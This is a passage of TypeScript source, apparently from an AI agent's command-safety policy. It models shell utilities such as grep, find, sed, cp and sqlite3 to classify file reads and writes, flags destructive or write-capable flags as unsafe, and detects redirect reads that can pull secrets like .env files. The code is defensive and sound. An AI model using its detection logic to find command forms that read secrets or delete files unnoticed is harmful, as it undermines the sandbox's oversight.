// like `grep .env log` do not false-deny. This remains defense-in-depth, not an exhaustive parser:
// the sandbox denyRead remains the OS backstop for read shapes this lexical pass does not model.
const FILE_READ_VERBS = ["cat", "head", "tail", "less", "more", "nl", "cut", "tac", "rev"] as const;

const FILE_READ_COMMAND_RE = new RegExp(
  `(?:^|[\\s;&|($\`])(?:${FILE_READ_VERBS.join("|")})\\s+([^;&|]+)`,
  "gu",
);
const POLICY_HTTP_URL = /\bhttps?:\/\/[^\s"'`<>]+/giu;

function pushFileReadSegment(
  segments: SideEffectSegmentT[],
  token: string,
  basePath: string,
  env: NodeJS.ProcessEnv,
  workspaceRoot = basePath,
  modifiers: SideEffectSegmentT["modifiers"] = [],
): void {
  const target = pathTarget(token, basePath, env, workspaceRoot);
  segments.push(
    segment({
      effectKinds: ["fs_read"],
      scopes: [pathScope(target.normalized!, workspaceRoot, env)],
      targets: [target],
      modifiers,
    }),
  );
}

function pushFileWriteSegment(
  segments: SideEffectSegmentT[],
  token: string,
  basePath: string,
  env: NodeJS.ProcessEnv,
  workspaceRoot = basePath,
): void {
  const target = pathTarget(token, basePath, env, workspaceRoot);
  segments.push(
    segment({
      effectKinds: ["fs_write"],
      scopes: [pathScope(target.normalized!, workspaceRoot, env)],
      targets: [target],
      modifiers: [],
    }),
  );
}

function pushFileReadSegments(
  segments: SideEffectSegmentT[],
  command: string,
  basePath: string,
  env: NodeJS.ProcessEnv,
  workspaceRoot = basePath,
): void {
  for (const match of command.matchAll(FILE_READ_COMMAND_RE)) {
    for (const token of pathTokens(match[1]!)) {
      pushFileReadSegment(segments, token, basePath, env, workspaceRoot);
    }
  }
}

interface UtilityModel {
  readonly safe: boolean;
  readonly reads: readonly string[];
  readonly writes: readonly string[];
}

function cleanPathOperand(raw: string | undefined): string | undefined {
  if (raw === undefined) return undefined;
  const token = stripShellPathToken(raw);
  if (token === "" || token === "-") return undefined;
  return token;
}

function redirectArgShape(raw: string): "none" | "standalone" | "attached" {
  if (/^(?:\d+)?(?:>>?|<)$/u.test(raw) || raw === "&>" || raw === "&>>") return "standalone";
  if (/^(?:\d+)?(?:>>?|<).+/u.test(raw) || /^&>>?.+/u.test(raw)) return "attached";
  return "none";
}

function argvWithoutRedirects(argv: readonly string[]): string[] {
  const result: string[] = [];
  for (let index = 0; index < argv.length; index += 1) {
    const arg = argv[index]!;
    const redirect = redirectArgShape(arg);
    if (redirect === "standalone") {
      index += 1;
      continue;
    }
    if (redirect === "attached") {
      continue;
    }
    result.push(arg);
  }
  return result;
}

function emptyUtilityModel(safe: boolean): UtilityModel {
  return { safe, reads: [], writes: [] };
}

function optionTakesValue(arg: string, names: ReadonlySet<string>): boolean {
  return names.has(arg);
}

function optionHasInlineValue(arg: string, names: readonly string[]): boolean {
  return names.some((name) => arg.startsWith(`${name}=`));
}

function shortOptionValue(
  raw: string,
  next: string | undefined,
  targetShorts: ReadonlySet<string>,
  valueTakingShorts: ReadonlySet<string>,
): { readonly value: string | undefined; readonly consumedNext: boolean } | undefined {
  if (!raw.startsWith("-") || raw.startsWith("--") || raw === "-") return undefined;
  const flags = raw.slice(1);
  for (let index = 0; index < flags.length; index += 1) {
    const flag = flags[index]!;
    const attached = flags.slice(index + 1);
    if (targetShorts.has(flag)) {
      return attached.length > 0
        ? { value: attached, consumedNext: false }
        : { value: next, consumedNext: true };
    }
    if (valueTakingShorts.has(flag)) {
      return undefined;
    }
  }
  return undefined;
}

function shortOptionConsumesNextValue(
  raw: string,
  valueTakingShorts: ReadonlySet<string>,
): boolean {
  if (!raw.startsWith("-") || raw.startsWith("--") || raw === "-") return false;
  const flags = raw.slice(1);
  for (let index = 0; index < flags.length; index += 1) {
    const flag = flags[index]!;
    if (valueTakingShorts.has(flag)) return index === flags.length - 1;
  }
  return false;
}

function modelGrepLike(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const reads: string[] = [];
  let safe = true;
  let patternSeen = argv[0] === "rg" && args.some((arg) => arg === "--files");
  const patternOptions = new Set(["-e", "--regexp"]);
  const patternFileOptions = new Set(["-f", "--file"]);
  const pathValueOptions = new Set(["--exclude-from", "--ignore-file"]);
  const valueOptions = new Set([
    "-A",
    "-B",
    "-C",
    "-m",
    "--after-context",
    "--before-context",
    "--context",
    "--max-count",
    "--exclude",
    "--exclude-dir",
    "--include",
    "--include-dir",
    "--label",
    "--glob",
    "-g",
    "--type",
    "-t",
    "--type-not",
    "-T",
  ]);

  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (argv[0] === "rg" && (raw === "--pre" || raw.startsWith("--pre="))) {
      safe = false;
      if (raw === "--pre") index += 1;
      continue;
    }
    if (raw === "--") {
      for (const rest of args.slice(index + 1)) {
        const token = cleanPathOperand(rest);
        if (token !== undefined) {
          if (patternSeen) reads.push(token);
          else patternSeen = true;
        }
      }
      break;
    }
    if (raw.startsWith("--file=")) {
      const token = cleanPathOperand(raw.slice("--file=".length));
      if (token !== undefined) reads.push(token);
      patternSeen = true;
      continue;
    }
    if (raw.startsWith("--exclude-from=") || raw.startsWith("--ignore-file=")) {
      const token = cleanPathOperand(raw.slice(raw.indexOf("=") + 1));
      if (token !== undefined) reads.push(token);
      continue;
    }
    if (raw.startsWith("-f") && raw.length > 2 && !raw.startsWith("--")) {
      const token = cleanPathOperand(raw.slice(2));
      if (token !== undefined) reads.push(token);
      patternSeen = true;
      continue;
    }
    if (raw.startsWith("--regexp=")) {
      patternSeen = true;
      continue;
    }
    if (raw.startsWith("-e") && raw.length > 2 && !raw.startsWith("--")) {
      patternSeen = true;
      continue;
    }
    if (optionTakesValue(raw, patternFileOptions)) {
      const token = cleanPathOperand(args[index + 1]);
      if (token !== undefined) reads.push(token);
      patternSeen = true;
      index += 1;
      continue;
    }
    if (optionTakesValue(raw, pathValueOptions)) {
      const token = cleanPathOperand(args[index + 1]);
      if (token !== undefined) reads.push(token);
      index += 1;
      continue;
    }
    if (optionTakesValue(raw, patternOptions)) {
      patternSeen = true;
      index += 1;
      continue;
    }
    if (optionTakesValue(raw, valueOptions) || optionHasInlineValue(raw, [...valueOptions])) {
      if (!raw.includes("=")) index += 1;
      continue;
    }
    if (raw.startsWith("-")) continue;
    const token = cleanPathOperand(raw);
    if (token === undefined) continue;
    if (patternSeen) reads.push(token);
    else patternSeen = true;
  }

  return { safe, reads, writes: [] };
}

function modelFind(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const reads: string[] = [];
  const writes: string[] = [];
  let safe = true;
  for (let index = 0; index < args.length; index += 1) {
    const arg = args[index]!;
    if (["-exec", "-execdir", "-ok", "-okdir", "-delete"].includes(arg)) safe = false;
    if (arg === "-files0-from" || arg === "--files0-from") {
      safe = false;
      const token = cleanPathOperand(args[index + 1]);
      if (token !== undefined) reads.push(token);
      index += 1;
      continue;
    }
    if (arg.startsWith("--files0-from=")) {
      safe = false;
      const token = cleanPathOperand(arg.slice("--files0-from=".length));
      if (token !== undefined) reads.push(token);
      continue;
    }
    if (arg === "-fprint" || arg === "-fprint0" || arg === "-fprintf") {
      safe = false;
      const token = cleanPathOperand(args[index + 1]);
      if (token !== undefined) writes.push(token);
      index += 1;
      continue;
    }
  }
  for (const raw of args) {
    if (raw === "--" || raw === "-H" || raw === "-L" || raw === "-P") continue;
    if (raw.startsWith("-") || raw === "!" || raw === "(" || raw === ")") break;
    const token = cleanPathOperand(raw);
    if (token !== undefined) reads.push(token);
  }
  return { safe, reads, writes };
}

function modelFileInspection(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const reads: string[] = [];
  const pathValueOptions = new Set(["-m", "--magic-file"]);
  const valueOptions = new Set(["-P", "--parameter"]);
  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (raw === "--") {
      for (const rest of args.slice(index + 1)) {
        const token = cleanPathOperand(rest);
        if (token !== undefined) reads.push(token);
      }
      break;
    }
    if (raw.startsWith("--files-from=")) {
      const token = cleanPathOperand(raw.slice("--files-from=".length));
      if (token !== undefined) reads.push(token);
      continue;
    }
    if (raw.startsWith("--magic-file=")) {
      const token = cleanPathOperand(raw.slice("--magic-file=".length));
      if (token !== undefined) reads.push(token);
      continue;
    }
    if (raw.startsWith("-m") && raw.length > 2 && !raw.startsWith("--")) {
      const token = cleanPathOperand(raw.slice(2));
      if (token !== undefined) reads.push(token);
      continue;
    }
    if (raw === "-f" || raw === "--files-from") {
      const token = cleanPathOperand(args[index + 1]);
      if (token !== undefined) reads.push(token);
      index += 1;
      continue;
    }
    if (optionTakesValue(raw, pathValueOptions)) {
      const token = cleanPathOperand(args[index + 1]);
      if (token !== undefined) reads.push(token);
      index += 1;
      continue;
    }
    if (optionTakesValue(raw, valueOptions) || optionHasInlineValue(raw, [...valueOptions])) {
      if (!raw.includes("=")) index += 1;
      continue;
    }
    if (raw.startsWith("-")) continue;
    const token = cleanPathOperand(raw);
    if (token !== undefined) reads.push(token);
  }
  return { safe: true, reads, writes: [] };
}

function modelGenericInspection(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const reads: string[] = [];
  const valueOptions = new Set([
    "-j",
    "-N",
    "-S",
    "-t",
    "-w",
    "-n",
    "--bytes",
    "--radix",
    "--read-bytes",
    "--skip-bytes",
    "--strings",
    "--width",
  ]);
  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (raw === "--") {
      for (const rest of args.slice(index + 1)) {
        const token = cleanPathOperand(rest);
        if (token !== undefined) reads.push(token);
      }
      break;
    }
    if (optionTakesValue(raw, valueOptions) || optionHasInlineValue(raw, [...valueOptions])) {
      if (!raw.includes("=")) index += 1;
      continue;
    }
    if (raw.startsWith("-")) continue;
    const token = cleanPathOperand(raw);
    if (token !== undefined) reads.push(token);
  }
  return { safe: true, reads, writes: [] };
}

function modelWc(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const reads: string[] = [];
  let safe = true;
  const safeLongOptions = new Set([
    "--bytes",
    "--chars",
    "--lines",
    "--words",
    "--max-line-length",
    "--total",
    "--help",
    "--version",
  ]);
  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (raw === "--") {
      for (const rest of args.slice(index + 1)) {
        const token = cleanPathOperand(rest);
        if (token !== undefined) reads.push(token);
      }
      break;
    }
    if (raw === "--files0-from") {
      safe = false;
      const token = cleanPathOperand(args[index + 1]);
      if (token !== undefined) reads.push(token);
      index += 1;
      continue;
    }
    if (raw.startsWith("--files0-from=")) {
      safe = false;
      const token = cleanPathOperand(raw.slice("--files0-from=".length));
      if (token !== undefined) reads.push(token);
      continue;
    }
    if (raw.startsWith("--")) {
      if (!safeLongOptions.has(raw) && !raw.startsWith("--total=")) safe = false;
      continue;
    }
    if (raw.startsWith("-")) {
      if (/[^cmlwL]/u.test(raw.slice(1))) safe = false;
      continue;
    }
    const token = cleanPathOperand(raw);
    if (token !== undefined) reads.push(token);
  }
  return { safe, reads, writes: [] };
}

function modelDiff(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const reads: string[] = [];
  const pathValueOptions = new Set(["--from-file", "--to-file", "--exclude-from"]);
  const valueOptions = new Set([
    "-I",
    "-F",
    "--ignore-matching-lines",
    "--show-function-line",
    "--label",
  ]);
  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (raw === "--") {
      for (const rest of args.slice(index + 1)) {
        const token = cleanPathOperand(rest);
        if (token !== undefined) reads.push(token);
      }
      break;
    }
    if (
      raw.startsWith("--from-file=") ||
      raw.startsWith("--to-file=") ||
      raw.startsWith("--exclude-from=")
    ) {
      const token = cleanPathOperand(raw.slice(raw.indexOf("=") + 1));
      if (token !== undefined) reads.push(token);
      continue;
    }
    if (optionTakesValue(raw, pathValueOptions)) {
      const token = cleanPathOperand(args[index + 1]);
      if (token !== undefined) reads.push(token);
      index += 1;
      continue;
    }
    if (optionTakesValue(raw, valueOptions) || optionHasInlineValue(raw, [...valueOptions])) {
      if (!raw.includes("=")) index += 1;
      continue;
    }
    if (raw.startsWith("-")) continue;
    const token = cleanPathOperand(raw);
    if (token !== undefined) reads.push(token);
  }
  return { safe: true, reads, writes: [] };
}

function modelPathReadingUtility(
  argv: readonly string[],
  options: {
    readonly valueOptions?: ReadonlySet<string>;
    readonly inlineValueOptions?: readonly string[];
    readonly pathValueOptions?: ReadonlySet<string>;
    readonly inlinePathValueOptions?: readonly string[];
    readonly shortInlineValuePattern?: RegExp;
  } = {},
): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const reads: string[] = [];
  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (raw === "--") {
      for (const rest of args.slice(index + 1)) {
        const token = cleanPathOperand(rest);
        if (token !== undefined) reads.push(token);
      }
      break;
    }
    if (optionTakesValue(raw, options.pathValueOptions ?? new Set())) {
      const token = cleanPathOperand(args[index + 1]);
      if (token !== undefined) reads.push(token);
      index += 1;
      continue;
    }
    const inlinePathOption = options.inlinePathValueOptions?.find((option) =>
      raw.startsWith(`${option}=`),
    );
    if (inlinePathOption !== undefined) {
      const token = cleanPathOperand(raw.slice(inlinePathOption.length + 1));
      if (token !== undefined) reads.push(token);
      continue;
    }
    if (optionTakesValue(raw, options.valueOptions ?? new Set())) {
      index += 1;
      continue;
    }
    if (
      optionHasInlineValue(raw, options.inlineValueOptions ?? []) ||
      options.shortInlineValuePattern?.test(raw) === true
    ) {
      continue;
    }
    if (raw.startsWith("-")) continue;
    const token = cleanPathOperand(raw);
    if (token !== undefined) reads.push(token);
  }
  return { safe: true, reads, writes: [] };
}

function sedScriptIsReadOnly(script: string | undefined): boolean {
  if (script === undefined || /[;\n\r]/u.test(script)) return false;
  const normalized = stripShellPathToken(script).trim();
  if (normalized === "") return false;
  return /^(?:(?:\d+|\$)(?:,(?:\d+|\$))?)?p$/u.test(normalized);
}

function sedScriptFragmentIsUnsafe(value: string | undefined): boolean {
  const trimmed = value?.trim() ?? "";
  if (trimmed === "") return false;
  return (
    /[;\n\r]/u.test(trimmed) ||
    (trimmed.startsWith("'") && !trimmed.endsWith("'")) ||
    (trimmed.startsWith('"') && !trimmed.endsWith('"'))
  );
}

function sedShortOptionContainsInPlace(raw: string): boolean {
  return raw.startsWith("-") && !raw.startsWith("--") && raw.slice(1).includes("i");
}

function modelSed(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const reads: string[] = [];
  const writes: string[] = [];
  const scripts: string[] = [];
  let safe = true;
  let scriptSeen = false;
  let inPlace = false;
  const safeLongOptions = new Set([
    "--quiet",
    "--silent",
    "--regexp-extended",
    "--separate",
    "--unbuffered",
    "--null-data",
    "--posix",
    "--help",
    "--version",
  ]);

  const addScript = (value: string | undefined): void => {
    if (sedScriptFragmentIsUnsafe(value)) safe = false;
    const script = stripShellPathToken(value ?? "").trim();
    if (script !== "") scripts.push(script);
    scriptSeen = true;
  };

  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (raw === "--") {
      const rest = args.slice(index + 1);
      if (!scriptSeen) {
        addScript(rest[0]);
        for (const operand of rest.slice(1)) {
          const token = cleanPathOperand(operand);
          if (token !== undefined) reads.push(token);
        }
      } else {
        for (const operand of rest) {
          const token = cleanPathOperand(operand);
          if (token !== undefined) reads.push(token);
        }
      }
      break;
    }
    if (raw === "-e" || raw === "--expression") {
      addScript(args[index + 1]);
      index += 1;
      continue;
    }
    if (raw.startsWith("--expression=")) {
      addScript(raw.slice("--expression=".length));
      continue;
    }
    if (raw.startsWith("-e") && raw.length > 2 && !raw.startsWith("--")) {
      addScript(raw.slice(2));
      continue;
    }
    if (/^-[nErsuz]*e$/u.test(raw)) {
      addScript(args[index + 1]);
      index += 1;
      continue;
    }
    if (raw === "-f" || raw === "--file") {
      safe = false;
      const token = cleanPathOperand(args[index + 1]);
      if (token !== undefined) reads.push(token);
      scriptSeen = true;
      index += 1;
      continue;
    }
    if (raw.startsWith("--file=")) {
      safe = false;
      const token = cleanPathOperand(raw.slice("--file=".length));
      if (token !== undefined) reads.push(token);
      scriptSeen = true;
      continue;
    }
    if (raw.startsWith("-f") && raw.length > 2 && !raw.startsWith("--")) {
      safe = false;
      const token = cleanPathOperand(raw.slice(2));
      if (token !== undefined) reads.push(token);
      scriptSeen = true;
      continue;
    }
    if (
      sedShortOptionContainsInPlace(raw) ||
      raw === "--in-place" ||
      raw.startsWith("--in-place=")
    ) {
      safe = false;
      inPlace = true;
      continue;
    }
    if (raw.startsWith("--")) {
      if (!safeLongOptions.has(raw)) safe = false;
      continue;
    }
    if (raw.startsWith("-")) {
      if (/[^nErsuz]/u.test(raw.slice(1))) safe = false;
      continue;
    }
    const token = cleanPathOperand(raw);
    if (token === undefined) continue;
    if (!scriptSeen) {
      addScript(raw);
    } else {
      reads.push(token);
      if (inPlace) writes.push(token);
    }
  }

  const helpOnly = args.length > 0 && args.every((arg) => arg === "--help" || arg === "--version");
  return {
    safe: safe && (helpOnly || (scripts.length > 0 && scripts.every(sedScriptIsReadOnly))),
    reads,
    writes,
  };
}

function modelTr(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  let safe = true;
  let parsingOptions = true;
  const safeLongOptions = new Set([
    "--complement",
    "--delete",
    "--squeeze-repeats",
    "--truncate-set1",
    "--help",
    "--version",
  ]);
  for (const raw of args) {
    if (parsingOptions && raw === "--") {
      parsingOptions = false;
      continue;
    }
    if (parsingOptions && raw.startsWith("--")) {
      if (!safeLongOptions.has(raw)) safe = false;
      continue;
    }
    if (parsingOptions && raw.startsWith("-") && raw !== "-") {
      if (/[^cCdst]/u.test(raw.slice(1))) safe = false;
    }
  }
  return emptyUtilityModel(safe);
}

function modelMkdir(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const writes: string[] = [];
  let safe = true;
  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (raw === "--") {
      for (const rest of args.slice(index + 1)) {
        const token = cleanPathOperand(rest);
        if (token !== undefined) writes.push(token);
      }
      break;
    }
    if (raw === "-m" || raw === "--mode") {
      index += 1;
      continue;
    }
    if (raw.startsWith("--mode=") || ["-p", "--parents", "-v", "--verbose"].includes(raw)) {
      continue;
    }
    if (raw.startsWith("-")) {
      safe = false;
      continue;
    }
    const token = cleanPathOperand(raw);
    if (token !== undefined) writes.push(token);
  }
  return { safe: safe && writes.length > 0, reads: [], writes };
}

function modelCp(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const operands: string[] = [];
  let safe = true;
  const riskyLong = [
    "--archive",
    "--attributes-only",
    "--backup",
    "--link",
    "--no-dereference",
    "--parents",
    "--preserve",
    "--reflink",
    "--remove-destination",
    "--sparse",
    "--symbolic-link",
  ];
  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (raw === "--") {
      for (const rest of args.slice(index + 1)) {
        const token = cleanPathOperand(rest);
        if (token !== undefined) operands.push(token);
      }
      break;
    }
    if (riskyLong.some((flag) => raw === flag || raw.startsWith(`${flag}=`))) {
      safe = false;
      continue;
    }
    if (raw === "-t" || raw === "--target-directory") {
      safe = false;
      index += 1;
      continue;
    }
    if (raw.startsWith("--target-directory=")) {
      safe = false;
      continue;
    }
    if (raw.startsWith("--")) {
      if (!["--force", "--interactive", "--no-clobber", "--verbose"].includes(raw)) {
        safe = false;
      }
      continue;
    }
    if (raw.startsWith("-")) {
      const flags = raw.slice(1);
      if (/[^fnvi]/u.test(flags)) safe = false;
      continue;
    }
    const token = cleanPathOperand(raw);
    if (token !== undefined) operands.push(token);
  }
  if (operands.length < 2) return { safe: false, reads: operands, writes: [] };
  return {
    safe,
    reads: operands.slice(0, -1),
    writes: [operands[operands.length - 1]!],
  };
}

function unquoteShellToken(value: string | undefined): string | undefined {
  const token = cleanPathOperand(value);
  if (token === undefined) return undefined;
  return token;
}

function modelSqlite(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const reads: string[] = [];
  let readonly = false;
  let safeModifiers = true;
  let database: string | undefined;
  const commands: string[] = [];
  const safeOptions = new Set([
    "-batch",
    "-bail",
    "-column",
    "-csv",
    "-header",
    "-html",
    "-json",
    "-line",
    "-list",
    "-noheader",
    "-quote",
    "-tabs",
  ]);

  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (raw === "-readonly") {
      readonly = true;
      continue;
    }
    if (raw === "-cmd" || raw === "-init") {
      safeModifiers = false;
      if (raw === "-init") {
        const initFile = cleanPathOperand(args[index + 1]);
        if (initFile !== undefined) reads.push(initFile);
      }
      index += 1;
      continue;
    }
    if (raw.startsWith("-")) {
      if (!safeOptions.has(raw)) safeModifiers = false;
      continue;
    }
    const token = cleanPathOperand(raw);
    if (token === undefined) continue;
    if (database === undefined) database = token;
    else commands.push(token);
  }

  if (database !== undefined) reads.push(database);
  const allowedCommands = new Set([".tables", ".schema", ".indexes"]);
  const safe =
    readonly &&
    safeModifiers &&
    database !== undefined &&
    commands.length === 1 &&
    allowedCommands.has(unquoteShellToken(commands[0]) ?? "");
  return { safe, reads, writes: [] };
}

function modelUtility(argv: readonly string[]): UtilityModel | undefined {
  switch (argv[0]) {
    case "grep":
    case "egrep":
    case "fgrep":
    case "rg":
      return modelGrepLike(argv);
    case "find":
      return modelFind(argv);
    case "file":
      return modelFileInspection(argv);
    case "strings":
    case "od":
      return modelGenericInspection(argv);
    case "wc":
      return modelWc(argv);
    case "sed":
      return modelSed(argv);
    case "tr":
      return modelTr(argv);
    case "diff":
      return modelDiff(argv);
    case "stat":
      return modelPathReadingUtility(argv, {
        valueOptions: new Set(["-c", "--format", "--printf"]),
        inlineValueOptions: ["--format", "--printf"],
        shortInlineValuePattern: /^-[ct].+/u,
      });
    case "realpath":
      return modelPathReadingUtility(argv, {
        pathValueOptions: new Set(["--relative-to", "--relative-base"]),
        inlinePathValueOptions: ["--relative-to", "--relative-base"],
      });
    case "readlink":
      return modelPathReadingUtility(argv);
    case "cmp":
      return modelPathReadingUtility(argv, {
        valueOptions: new Set(["-i", "--ignore-initial", "-n", "--bytes"]),
        inlineValueOptions: ["--ignore-initial", "--bytes"],
        shortInlineValuePattern: /^-[in].+/u,
      });
    case "mkdir":
      return modelMkdir(argv);
    case "cp":
      return modelCp(argv);
    case "sqlite3":
      return modelSqlite(argv);
    case "which":
      return emptyUtilityModel(true);
    // F-3 RC1: read-only utilities that ARE safe in their observing form but expose a write/clock
    // mode through one flag/operand. Modeled (not blanket-allowed) so the safe form allows and the
    // dangerous form keeps its POL-003 review — the write target/clock mutation is surfaced.
    case "sort":
      return modelSort(argv);
    case "uniq":
      return modelUniq(argv);
    case "date":
      return modelDate(argv);
    case "tree":
      return modelTree(argv);
    default:
      return undefined;
  }
}

/** `sort` is read-only unless `-o FILE` / `--output=FILE` writes a file. Every other flag observes. */
function modelSort(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const reads: string[] = [];
  const writes: string[] = [];
  const outputShorts = new Set(["o"]);
  const valueTakingShorts = new Set(["k", "o", "S", "t", "T", "y"]);
  let safe = true;
  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (raw === "--") {
      for (const rest of args.slice(index + 1)) {
        const token = cleanPathOperand(rest);
        if (token !== undefined) reads.push(token);
      }
      break;
    }
    if (raw === "-o" || raw === "--output") {
      safe = false;
      const token = cleanPathOperand(args[index + 1]);
      if (token !== undefined) writes.push(token);
      index += 1;
      continue;
    }
    if (raw.startsWith("--output=")) {
      safe = false;
      const token = cleanPathOperand(raw.slice("--output=".length));
      if (token !== undefined) writes.push(token);
      continue;
    }
    const shortOutput = shortOptionValue(raw, args[index + 1], outputShorts, valueTakingShorts);
    if (shortOutput !== undefined) {
      safe = false;
      const token = cleanPathOperand(shortOutput.value);
      if (token !== undefined) writes.push(token);
      if (shortOutput.consumedNext) index += 1;
      continue;
    }
    if (shortOptionConsumesNextValue(raw, valueTakingShorts)) {
      index += 1;
      continue;
    }
    if (raw.startsWith("-")) continue; // -n, -r, -k, -u, … all observe
    const token = cleanPathOperand(raw);
    if (token !== undefined) reads.push(token);
  }
  return { safe, reads, writes };
}

/** `uniq [OPTS] [INPUT [OUTPUT]]`: a SECOND positional operand is an output file (write). Options
 *  observe; only `-f`/`-s`/`-w` (and long spellings) consume a numeric argument, so a real output
 *  operand can never be miscounted as a flag value (a filename in that slot makes uniq error, no
 *  write). Uncertainty biases toward unsafe (review), never toward a false allow. */
function modelUniq(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const argTakingShort = new Set(["-f", "-s", "-w"]);
  const argTakingLong = new Set(["--skip-fields", "--skip-chars", "--check-chars"]);
  const operands: string[] = [];
  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (raw === "--") {
      for (const rest of args.slice(index + 1)) {
        const token = cleanPathOperand(rest);
        if (token !== undefined) operands.push(token);
      }
      break;
    }
    if (argTakingShort.has(raw) || argTakingLong.has(raw)) {
      index += 1; // consume the flag's numeric argument
      continue;
    }
    if (raw.startsWith("-")) continue; // --count, -c, -d, -u, --skip-fields=N, … observe
    const token = cleanPathOperand(raw);
    if (token !== undefined) operands.push(token);
  }
  const writes = operands.slice(1); // operand #2+ = output file(s)
  return { safe: writes.length === 0, reads: operands.slice(0, 1), writes };
}

/**
 * `date` is auto-allowed only for display forms that are unambiguously read-only across GNU/BSD:
 * no args, `+FORMAT`, and simple UTC/format flags. Setter flags and positional operands fail closed.
 */
function modelDate(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  let safe = true;
  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (raw === "--") {
      for (const operand of args.slice(index + 1)) {
        if (!operand.startsWith("+")) safe = false;
      }
      break;
    }
    if (raw.startsWith("+")) continue;
    if (raw === "--set" || raw.startsWith("--set=")) {
      safe = false;
      continue;
    }
    if (raw.startsWith("--")) {
      if (
        raw === "--utc" ||
        raw === "--universal" ||
        raw === "--help" ||
        raw === "--version" ||
        raw === "--iso-8601" ||
        raw.startsWith("--iso-8601=") ||
        raw.startsWith("--rfc-3339=")
      ) {
        continue;
      }
      safe = false;
      continue;
    }
    if (raw.startsWith("-")) {
      if (raw === "-s" || raw.startsWith("-s") || /^-[^-]*s/u.test(raw)) {
        safe = false;
        continue;
      }
      if (/^-[uRj]+$/u.test(raw) || raw === "-I" || raw.startsWith("-I")) continue;
      safe = false;
      continue;
    }
    safe = false;
  }
  return { safe, reads: [], writes: [] };
}

/** `tree` observes unless `-o FILE` / `-O FILE` writes its listing to a file. */
function modelTree(argv: readonly string[]): UtilityModel {
  const args = argvWithoutRedirects(argv.slice(1));
  const reads: string[] = [];
  const writes: string[] = [];
  const outputShorts = new Set(["o", "O"]);
  const valueTakingShorts = new Set(["H", "I", "L", "o", "O", "P", "T"]);
  let safe = true;
  for (let index = 0; index < args.length; index += 1) {
    const raw = args[index]!;
    if (raw === "--") {
      for (const rest of args.slice(index + 1)) {
        const token = cleanPathOperand(rest);
        if (token !== undefined) reads.push(token);
      }
      break;
    }
    if (raw === "-o" || raw === "-O") {
      safe = false;
      const token = cleanPathOperand(args[index + 1]);
      if (token !== undefined) writes.push(token);
      index += 1;
      continue;
    }
    const shortOutput = shortOptionValue(raw, args[index + 1], outputShorts, valueTakingShorts);
    if (shortOutput !== undefined) {
      safe = false;
      const token = cleanPathOperand(shortOutput.value);
      if (token !== undefined) writes.push(token);
      if (shortOutput.consumedNext) index += 1;
      continue;
    }
    if (shortOptionConsumesNextValue(raw, valueTakingShorts)) {
      index += 1;
      continue;
    }
    if (raw.startsWith("-")) continue;
    const token = cleanPathOperand(raw);
    if (token !== undefined) reads.push(token);
  }
  return { safe, reads, writes };
}

function pushUtilitySegments(
  segments: SideEffectSegmentT[],
  argv: readonly string[],
  basePath: string,
  env: NodeJS.ProcessEnv,
  workspaceRoot = basePath,
): void {
  const model = modelUtility(argv);
  if (model === undefined) return;
  for (const token of model.reads) {
    const target = pathTarget(token, basePath, env, workspaceRoot);
    const scope = pathScope(target.normalized!, workspaceRoot, env);
    pushFileReadSegment(
      segments,
      token,
      basePath,
      env,
      workspaceRoot,
      scope === "workspace" || scope === "temp" ? [] : ["unknown"],
    );
  }
  for (const token of model.writes) {
    pushFileWriteSegment(segments, token, basePath, env, workspaceRoot);
  }
}

// `< file` input redirects and the `$(< file)` read builtin read a file — including a secret —
// without naming a read verb. Classify them as fs_read too. The lookarounds exclude `<<`/`<<<`
// heredoc/here-string and `<( … )` process substitution (whose operand is excluded by the class).
function pushRedirectReadSegments(
  segments: SideEffectSegmentT[],
  command: string,
  basePath: string,
  env: NodeJS.ProcessEnv,
  workspaceRoot = basePath,
): void {
  for (const match of command.matchAll(/(?<![<>])<(?!<)\s*([^\s;&|()<>]+)/gu)) {
    const token = stripShellPathToken(match[1]!);
    if (token !== "") pushFileReadSegment(segments, token, basePath, env, workspaceRoot);
  }
}

function redirectWriteTargets(command: string): string[] {
  const targets: string[] = [];
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;

  const readTarget = (start: number): { readonly target?: string; readonly nextIndex: number } => {
    let index = start;
    while (index < command.length && /\s/u.test(command[index]!)) index += 1;
    if (command[index] === "&" || command[index] === undefined) return { nextIndex: index };
    if (command[index] === "'" || command[index] === '"') {
      const quote = command[index]!;
      let end = index + 1;
      while (end < command.length && command[end] !== quote) end += 1;
      return { target: command.slice(index, end + 1), nextIndex: end + 1 };
    }
    let end = index;
    while (end < command.length && !/[\s;&|<>]/u.test(command[end]!)) end += 1;
